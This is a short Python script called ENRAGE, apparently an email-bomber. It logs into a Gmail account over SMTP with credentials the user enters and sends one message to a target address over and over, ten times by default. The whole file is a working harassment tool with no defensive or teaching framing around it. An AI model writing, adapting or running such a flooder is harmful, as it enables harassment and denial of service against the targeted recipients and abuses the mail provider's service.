#!usr/bin/env python3
#ENRAGE by off3n1ed
import smtplib
import re
from subprocess import call

class ENRAGE:
    def __init__(self):
        self.actions(0)
        self.start()
    
    def start(self):
        try:
            self.email = input("[+] inter your email > ")
            self.email = self.check_login(self.email)
            self.password = input("[+] inter your email password > ")
            self.target_email = input("[+] inter target email > ")
            self.target_email = self.check_login(self.target_email)
            self.message = input("[+] input message > ")
            try:
                self.amount = int(input("[+] amount of message (default 10) > "))
            except ValueError:
                self.amount = 10
        except KeyboardInterrupt:
            self.actions(1)

        self.run(self.email, self.password, self.target_email, self.message, self.amount)

    def run(self, email, password, target_email, message, amount):
        self.count = 1
        self.actions(0)
        print("FROM\t\t\t\tTO\t\t\t\tSENT\n--------------------------------------------------------------------")
        try:
            for i in range(amount):
                error = self.send(email, password, target_email, message)
                if str(error) == "Authentication error":
                    self.actions(0)
                    self.actions(2)
                    break
                print("\r" + email + "\t\t" + target_email + "\t\t" + str(self.count), end="")
                self.count += 1
        except KeyboardInterrupt:
            self.actions(0)
        self.actions(1)
          
    def actions(self, act):
        if act == 0:
            call(["clear"])
            print("--ENRAGE--\n")
        elif act == 1:
            print("\n\n[+]Thanks for using ENRAGE\n\n")
        elif act == 2:
            print('''[-] Oops! It looks you have incorrect login details! Check your login details\n[!] Allow access for https://www.google.com/settings/security/lesssecureapps''')

    def send(self, email, password, target_email, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        try:
            server.login(email, password)
        except smtplib.SMTPAuthenticationError:
            return "Authentication error"
        server.sendmail(email, target_email, message)
        
    def check_login(self, email):
        check = re.search("@gmail.com", email)  
        if str(check) in "None":
            email += "@gmail.com"
            return email
        else:
            return email

launch = ENRAGE()
